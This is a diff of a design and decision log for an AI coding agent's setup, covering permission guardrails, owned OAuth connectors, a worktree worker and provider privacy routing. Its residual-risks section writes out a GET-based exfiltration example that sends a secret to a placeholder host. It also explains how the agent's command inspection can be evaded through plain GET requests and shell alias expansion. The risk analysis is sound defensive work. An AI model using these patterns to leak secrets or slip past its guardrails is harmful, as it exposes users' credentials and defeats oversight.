@@ -70,6 +70,30 @@ No community package is risk-free. Static review and pinning reduce supply-chain
 risk but cannot prove the absence of malicious behavior. A package that can read
 Gmail or control an authenticated browser belongs in the highest trust tier.
 
+Named residual risks the guardrails cannot close (accepted 2026-07-21):
+
+- **GET-based exfiltration.** A plain `curl https://host/?d=<secret>` is
+  indistinguishable from a legitimate read by command-text inspection. Upload
+  flags and substitution-wrapped secret reads are blocked, but the only real fix
+  is an egress allowlist or OS sandbox. Use Codex or Claude Code for
+  high-autonomy work against untrusted content.
+- **Token custody sits outside the guardrails.** The permission policy blocks
+  the agent's tools from reading `~/.pi/agent/auth.json`; it cannot constrain
+  the MCP adapter process, which owns that file as part of its function. Adapter
+  code review and version pinning are the only controls on token confidentiality.
+- **Alias expansion happens after policy inspection.** `shellCommandPrefix`
+  evals dotfiles aliases in every shell command, so the policy sees the alias
+  name, not its expansion. Keep destructive aliases out of the sourced alias
+  block; the guardrail cannot see through them.
+
+Pinning discipline: version pins plus lockfile integrity hashes protect against
+dist-tag repointing and republished tarballs only when installs are
+hash-verified. The npm manifest under `~/.pi/agent/npm` must use exact versions,
+not caret ranges, and upgrades must be deliberate. Vendoring a reviewed copy
+adds maintenance burden without adding trust beyond what the lockfile hash
+already guarantees; the long-term answer for connector trust is the small owned
+read-only adapter named under Source connectors, not a fork.
+
 ## Adopted
 
 | Capability | Decision and evidence | Guardrail / removal |
@@ -81,7 +105,9 @@ Gmail or control an authenticated browser belongs in the highest trust tier.
 | Permission policy and safe Git | Block protected reads/writes, dependency-tree writes, uploads, destructive Git, and risky shell mutations before execution. | These are not containment. Keep tests aligned with real failure modes. |
 | Consult | Supplies an explicit independent review without a permanent subagent fleet. | User-invoked and bounded. |
 | Discovery telemetry | Time-boxed local evidence for navigation and verification friction before adding code intelligence. | Review after one week; remove completely if it does not change a decision. |
-| MCP discovery proxy | `pi-mcp-adapter` keeps large remote tool catalogs out of the system prompt. Version 2.11.0 is pinned. | Automatic OAuth is off. Remote tools are read-only allowlisted. Do not grant high-value tokens without reviewing client, server, scopes, and storage. |
+| Owned Google read-only connector | `google-readonly.ts` implements Gmail/Calendar search and read directly against `googleapis.com` with loopback OAuth (PKCE), read-only scopes, and 0600 token storage. Replaces the generic adapter route so no third-party dependency tree sits in the token path. | Requires a user-created Google Cloud OAuth client; `/google-auth` is explicit; credential files are on the protected read list; tools are read-only by construction. |
+| Bounded worktree worker | `/worker` delegates one task to a child Pi in an isolated git worktree — the smallest validated slice of the subagent research track. | One worker at a time; child may not commit, push, or install; parent reviews the diff and owns the merge. Remove if delegation does not save time on repeated decomposable work. |
+| Plan preset | `/preset plan` gives a read-only planning stance with a required scope/non-goals/steps/verification contract before switching to dev. | A preset plus instructions, no machinery. Remove if unused. |
 | Native Agent Browser wrapper | `pi-agent-browser-native` 0.2.71 is a thin Pi tool around the already-adopted Agent Browser CLI. It adds structured results, context spills, redaction, stale-ref checks, session recovery, and artifact metadata. | Pin the version, use temporary sessions by default, keep optional web-search credentials disabled, and remove if native wrapping does not reduce browser failures or context. |
 | Internal multipart reconciliation | Agents track all user requests and close them in the final answer. | Show a visible ledger only when it materially improves coordination. |
 
@@ -102,11 +128,41 @@ These decisions are intentional. Re-evaluate only when the named condition chang
 | LSP, AST, or semantic index by default | Deferred | Plausible leverage, but no local evidence yet identifies definitions, references, diagnostics, or repository mapping as the dominant bottleneck. | Discovery telemetry names a repeated failure and a bounded trial reduces it. |
 | Persistent subagent fleet | Rejected for now | A roster and parallel writers add coordination, trust, and reconciliation cost. `/consult` covers independent review. | Two or more independent threads recur and bounded delegation measurably reduces latency or protects context. |
 | Automatic parallel writers | Rejected | Shared-checkout mutation races and unclear ownership are worse than sequential work. | Every writer is isolated in a worktree with explicit ownership and parent verification. |
+| `pi-mcp-adapter` MCP proxy | Removed 2026-07-22 | Every routed server moved to owned connectors (Google, Strava) or a project-scoped pinned `mcp-remote` (Granola); an idle proxy carrying ~200 transitive packages earned nothing. The permission policy's remote-MCP default-deny stays as dormant defense. | A remote MCP server earns adoption that a small owned client cannot serve |
 | `pi-web-access` | Deferred | Useful search/fetch coverage, but it combines multiple providers, automatic repository cloning, browser-cookie access, local-video upload, and several fallback egress paths in one 7 MB package. | Existing retrieval repeatedly blocks work and a constrained configuration can prove provider and data-flow boundaries. |
 | Broad community package bundle | Rejected | Permanent metadata and arbitrary-code surface grow faster than proven value. | Each package independently passes the selection rules. |
 | Duplicate diff approval UI | Rejected | Git diff, precise Edit failures, tests, and review skills already provide the verification loop. | A recurring bad patch bypasses those layers and a preview gate would have caught it. |
 
+## Provider routing and privacy
+
+Connector mechanics do not decide who sees the data; the active model provider
+does. Anything a tool returns — email, calendar, meeting notes — enters the
+session context and is sent to whichever provider serves the session (OpenAI via
+the Codex subscription, OpenRouter, Google, Anthropic, or a local model).
+
+Working policy:
+
+- For sessions that read Gmail/Calendar/Granola content, prefer the provider
+  already holding that data (Google models for Google data) or a local model.
+  Pi's per-session model switching makes this a one-keystroke choice, which is a
+  capability Claude Code and Codex do not offer.
+- Claude and Codex connectors send the same source data to Anthropic or OpenAI
+  respectively; using them is a data-routing decision, not just a convenience.
+- Default remains the Codex subscription route for coding work that does not
+  touch personal source data.
+
 ## Research tracks
+
+### Parking lot (no active work)
+
+- **Footer tightening:** legend terseness pass and ctx-severity threshold tuning
+  once the annotations bed in.
+- **Multi-session awareness:** read-only listing of live Pi sessions (pid, cwd,
+  model, ctx%, cost) across terminals; cheaper than tabs, fits tmux.
+- **Speed-based model comparison:** record per-model tok/s and cost history from
+  the footer data to inform model choice.
+- **Private preset:** a preset or binding that pins source-data sessions to a
+  Google or local model per the privacy policy above.
 
 ### Prompt navigation
 
@@ -146,15 +202,14 @@ These decisions are intentional. Re-evaluate only when the named condition chang
 
 ### Interactive shell, subagents, and worktrees
 
-- **Candidate:** https://github.com/nicobailon/pi-interactive-shell
-- **Useful existing work:** observable PTY overlay, takeover, background sessions,
-  dispatch completion, structured Pi/Codex/Claude spawning, attach/dismiss, and
-  worktree isolation.
-- **Risk:** arbitrary interactive process execution, hidden background work,
-  completion-triggered turns, and easy over-parallelization.
-- **Next test:** one read-only reviewer in dispatch mode. Then one mutating worker
-  in an isolated worktree with parent-owned review and verification.
-- **Adopt only if:** delegation saves time or context on repeated decomposable work.
+- **First slice built 2026-07-22:** `/worker` (see Adopted) covers the "one
+  mutating worker in an isolated worktree with parent-owned review" test using
+  ~200 owned lines instead of the community package.
+- **Candidate for the rest:** https://github.com/nicobailon/pi-interactive-shell
+  (PTY overlay, background sessions, attach/dismiss) remains unadopted.
+- **Evidence to expand:** `/worker` repeatedly saves time or context on
+  decomposable work and the missing piece is observability or backgrounding,
+  not another writer.
 - **Never adopt:** concurrent writers in one checkout or autonomous merge/push.
 
 ### Web access
@@ -178,20 +233,25 @@ These decisions are intentional. Re-evaluate only when the named condition chang
 
 ### Source connectors
 
-- **Goal:** Pi can read Gmail, Google Calendar, Granola, and Strava so communication
-  tracking does not depend on Claude Code.
-- **Google server provenance:** Gmail and Calendar endpoints are on official
-  `googleapis.com` domains and advertise Google Accounts authorization metadata.
-- **Client provenance:** `pi-mcp-adapter` is community-maintained, not official Pi
-  or Google support. It stores tokens in plaintext JSON with mode 0600 and executes
-  with full user permissions.
-- **Current gate:** no Gmail, Calendar, or Strava OAuth token is granted until the
-  pinned adapter, scopes, allowlist, endpoint metadata, and revocation path are
-  documented and accepted.
-- **Fallback:** use the working Claude connectors while building a smaller
-  Workbench-owned read-only adapter if the generic client's trust is unacceptable.
-- **Cut criterion:** remove the generic adapter if constrained OAuth and local
-  allowlisting cannot make its residual trust acceptable.
+- **Resolved 2026-07-22:** the Workbench-owned read-only connector
+  (`google-readonly.ts`) replaced the generic adapter route for Gmail and
+  Calendar. Direct REST to `googleapis.com`, loopback OAuth with PKCE, read-only
+  scopes, no third-party code in the token path.
+- **Credential layout (2026-07-22):** one agent-neutral root at
+  `~/Library/Application Support/notes-app/` holds the shared Google OAuth
+  client, the connectors' read-only tokens, the labeler's modify-scope token,
+  and the Strava client/token. The root is read- and write-protected by the
+  permission policy; each consumer holds its own separately scoped grant.
+- **Strava resolved 2026-07-22:** `strava-readonly.ts` uses the free personal
+  API with a user-registered app (callback domain `localhost`) instead of the
+  MCP route, whose discovery metadata is incompatible with local proxies.
+- **Revocation:** delete the token file under the credential root and revoke the
+  grant at https://myaccount.google.com/permissions (Google) or
+  https://www.strava.com/settings/apps (Strava).
+- **Granola:** stays on its pinned `mcp-remote` route in the notes project — the
+  only remaining MCP path. Granola's local cache is encrypted (`cache-v6.json.enc`),
+  so a local file reader is not viable without reverse-engineering; the hosted
+  MCP endpoint is the vendor-supported read path.
 
 ## Community watchlist
 
